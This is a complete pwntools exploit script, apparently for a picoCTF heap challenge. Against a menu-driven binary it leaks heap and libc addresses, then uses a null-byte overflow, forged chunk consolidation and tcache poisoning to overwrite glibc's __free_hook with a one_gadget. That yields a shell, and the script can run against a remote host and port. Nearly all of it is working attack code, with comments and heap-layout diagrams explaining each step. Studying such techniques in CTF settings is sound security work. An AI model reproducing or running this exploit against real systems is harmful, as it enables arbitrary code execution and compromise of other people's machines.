from pwn import *

BINARY = './gd_patched'


# Application logic functions
def add(size):
	p.sendlineafter('> ', '1')

	if size <= 0xf0:
		p.sendlineafter('> ', '1')
	else:
		p.sendlineafter('> ', '2')

	p.sendlineafter(': ', str(size))
	p.recvuntil('page #')
	print('New page: ' + str(int(p.recvline().strip())))

def talk(page, content):
	p.sendlineafter('> ', '2')
	p.sendlineafter(': ', str(page))
	p.sendlineafter(': ', content)

def listen(page):
	p.sendlineafter('> ', '3')
	p.sendlineafter(': ', str(page))
	content = p.recvline().split(b': ')[1].strip(b'\n')
	return content

def free(page):
	p.sendlineafter('> ', '4')
	p.sendlineafter(': ', str(page))


def pwn():
	print('Structs @ 0x00404100')


	# Setup
	add(0xf0) # 0 Will overlap following chunks
	add(0x28) # 1 Will be overlapped by 0
	add(0x28) # 2 To overflow inuse of nextchunk
	add(0xf0) # 3 will be overflown

	log.info('4 pages added')

	# Fill up tcache bin 0xf0
	# Done because the NULL byte overflow will unset the PREV_INUSE bit of the next chunk
	# Meaning that it will change the next chunks size to 0x100
	# 0x100 chunks go into the 0xf0 tcache bin
	# We prevent this since we want backwards consolidation to occur
	# This will be evident further below
	for i in range(7):
		add(0xf0) # add 4-12
	for i in range(7):
		free(i+4)

	log.info('Fill up tcache bin 0xf0')


	''' 
	Since this new chunk has the same size of the last free'd chunk, it will reuse its memory.
	The last available bin is a tcache bin, which has the following structure
	
	| (null) | size + bits |
	|   fd   | data (null) |

	Where fd is a pointer to the next available chunk, which is the one free'd before.
	So when we create now a new page page->data will point to a free'd chunk,
	so we'll get a heap leak

	''' 
	add(0xf0)


	heap_leak = u64(listen(4).ljust(8, b'\x00')) # 4 is the first available index
	log.success("Heap leak page 9(#4) @ 0x{:x}".format(heap_leak))


	heap_page0 = heap_leak - 0x760 # Calculate as 5*0x100 + 0x100 + 0x30*2 + 0x100
	log.success("Heap leak page 0 @ 0x{:x}".format(heap_page0))

	free(4) # Deletes this last page and fills tcache bin

	'''
	We want...

	|     0x0      |     0x101    | -> pages[0]
	|     0x0      |     0x151    | -> NEW chunk
	|     HEAP     |      HEAP    | -> fd and bd, since we are simulating an unsorted bin
	|     ...      |      ...     |
	|     0x0      |     0x31     | -> pages[1]
	|     ...      |      ...     |
	|     0x0      |     0x31     | -> pages[2]
	|      -       |       -      |
	|      -       |       -      |
	|     0x150    |     0x100    | -> pages[3]
	|      -       |       -      |

	This way, if we free(3), the chunk will be merged with the previous chunks until NEW chunk.
	This is because we modified the pages[3]-> prev_size to 150 (so malloc will think the previous 
	chunk is not in use and has 150 bytes).

	'''


	# Comment here
	talk(0, p64(0)+p64(0x151)+p64(heap_page0)+p64(heap_page0))

	log.info('Null byte poison')
	talk(2, b'A'*0x20 + p64(0x150))

	# The chunk we have just modified will be free'd and consolidated with the previous one, which
	# is marked as free'd because of the null-byte inside the PREV_INUSE bit of the next chunk
	free(3)

	'''
	After free...
	|     0x0      |     0x101    | -> pages[0]
	|     0x0      |     0x151    | <------------ New bin points HERE
	|     LIBC     |      LIBC    | -> fd and bd, since it has been free'd
	|     ...      |      ...     |
	|     0x0      |     0x31     | -> pages[1]
	|     ...      |      ...     |
	|     0x0      |     0x31     | -> pages[2]
	|      -       |       -      |
	|      -       |       -      |
	|     0x150    |     0x100    | -> pages[3]
	|      -       |       -      |

	'''

	# The consolidated free'd chunk will be used to allocate this new page, and its page->data pointer
	# will point to libc's __main_arena__ because it previously contained a free'd chunk

	add(0x110) # Size must be 110 in order to be allocated inside our crafted unsorted bin

	'''
	After add...
	|     0x0      |     0x101    | -> pages[0]
	|     0x0      |     0x121    | -> pages[3]  ->  New chunk of size 0x110 (+0x10)
	|     LIBC     |      LIBC    | -> fd and bd, since we are simulating an unsorted bin
	|     ...      |      ...     |
	|     0x0      |     0x31     | -> pages[1]
	|     ...      |      ...     |
	|     0x0      |     0x31     | -> pages[2]
	|      -       |       -      |
	|      -       |       -      |
	|     0x150    |     0x100    | -> free
	|      -       |       -      |

	'''

	# Once we have the leak of the __main_arena__, we can use GDB to get the offsets, which will be always the same (if the libc is the same)
	libc = u64(listen(3).ljust(8, b'\x00')) # This will leak libc by printing fd of unsorted bin
	libc_base = libc - 0x3ebee0 
	free_hook = libc_base + 0x3ed8e8 

	'''
	We can pop a shell using a one_gadget, or use a ROPchain
	root@PwnedC0ffee:~/Desktop/HEAP/double_free/picoCTF# one_gadget libc.so.6 
		0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
			constraints:
			  rsp & 0xf == 0
			  rcx == NULL

		0x4f322 execve("/bin/sh", rsp+0x40, environ)
			constraints:
		  		[rsp+0x40] == NULL
	'''
	one_gadget = libc_base + 0x4f322 

	log.success("Libc-Leak @ 0x{:x}".format(libc))
	log.success("Libc-Base @ 0x{:x}".format(libc_base))
	log.success("Free-Hook @ 0x{:x}".format(free_hook))
	log.success("One Gadget @ 0x{:x}".format(one_gadget))

	free(1)
	'''
	After free...
	|     0x0      |     0x101    | -> pages[0]
	|     0x0      |     0x121    | -> pages[3]
	|     0x61     |     0x61     |
	|     ...      |      ...     |
	|     0x61     |     0x31     | -> pages[1]
	|     LIBC     |     LIBC     |
	|     ...      |      ...     |
	|     0x0      |     0x31     | -> pages[2]
	|      -       |       -      |
	|      -       |       -      |
	|     0x150    |     0x100    | -> free
	|      -       |       -      |

	'''

	talk(3, b'A'*0xe8 + p64(0x31) + p64(free_hook)*2)

	'''
	After talk...
	|     0x0      |     0x101    | -> pages[0]
	|     0x0      |     0x121    | -> pages[3]
	|     0x61     |     0x61     |
	|     ...      |      ...     |
	|     0x61     |     0x31     | -> free
	|     FREE     |     FREE     |
	|     ...      |      ...     |
	|     0x0      |     0x31     | -> pages[2]
	|      -       |       -      |
	|      -       |       -      |
	|     0x150    |     0x100    | -> free
	|      -       |       -      |
	
	This way, we have modified the fd and bd pointers of the free(1) tcache bin.
	This is called tcache poisoning.
	If we allocate a new chunk which fits inside this new tcache bin (of size 0x30)
	ptmalloc will think there is another available tcache bin of size 0x30, which 
	actually is the free hook, so we will be able to overwrite it with our ROP chain

	'''

	add(32) # consume deleted Page 1 and populate last bin pointer with free_hook
	'''
	|     0x0      |     0x101    | -> pages[0]
	|     0x0      |     0x121    | -> pages[3]
	|     0x61     |     0x61     |
	|     ...      |      ...     |
	|     0x61     |     0x31     | -> pages[1]
	|     ...      |      ...     |
	|     ...      |      ...     |
	|     0x0      |     0x31     | -> pages[2]
	|      -       |       -      |
	|      -       |       -      |
	|     0x150    |     0x100    | -> free
	|      -       |       -      |

	The next available tcache bin will point to the free hook

	'''



	add(32) # And finally allocate at free_hook
	talk(4,p64(one_gadget)) # And now just write into the free_hook

	# From now on, every free() call will execute our one_gadget
	free(1)

	p.interactive()




	
	


if __name__ == "__main__":
	log.warn("IMPORTANT: Make sure your binary has been patched and is using the correct version of libc and ld loader!")

	log.info("For remote: %s HOST PORT" % sys.argv[0])
	log.info("For debug: %s -d\n" % sys.argv[0])

	if len(sys.argv) > 2:
		p = remote(sys.argv[1], int(sys.argv[2]))
		pwn()

	else:

		# Debug
		if len(sys.argv) > 1 and sys.argv[1] == '-d':
			p = gdb.debug(BINARY,'''
			continue
			'''.format(BINARY))

		else:
			p = process(BINARY)
	

		pwn()
